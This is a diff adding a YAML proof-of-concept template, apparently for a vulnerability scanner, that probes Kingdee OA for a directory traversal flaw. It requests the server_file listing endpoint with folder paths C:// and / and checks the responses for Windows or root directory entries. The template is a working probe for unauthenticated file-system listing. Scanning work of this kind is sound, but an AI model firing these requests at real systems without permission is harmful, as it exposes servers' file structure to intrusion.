@@ -1,0 +1,25 @@
+name: yaml-poc-kingdee-kingdee_oa-directory_traversal-CT-194280
+binding: 025bd4f6-6297-49d5-b186-2fd83fb87687
+detail:
+    author: system_user
+    links:
+        - https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E8%9D%B6OA%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md
+    vulnerability:
+        id: 62b702b7-e784-4654-b1cf-5ea085e748df
+        level: medium
+    warning: Harmless
+transport: http
+rules:
+    kingdee1:
+        request:
+            cache: true
+            method: GET
+            path: /appmonitor/protected/selector/server_file/files?folder=C://&suffix=
+        expression: response.status == 200 && response.headers["content-type"].contains("json") && response.body.bcontains(b"{\"name\":\"Windows\",\"path\":\"C:\\\\Windows\",\"folder\":true}")
+    kingdee2:
+        request:
+            cache: true
+            method: GET
+            path: /appmonitor/protected/selector/server_file/files?folder=/&suffix=
+        expression: response.status == 200 && response.headers["content-type"].contains("json") && response.body.bcontains(b"{\"name\":\"root\",\"path\":\"/root\",\"folder\":true}")
+expression: kingdee1() || kingdee2()
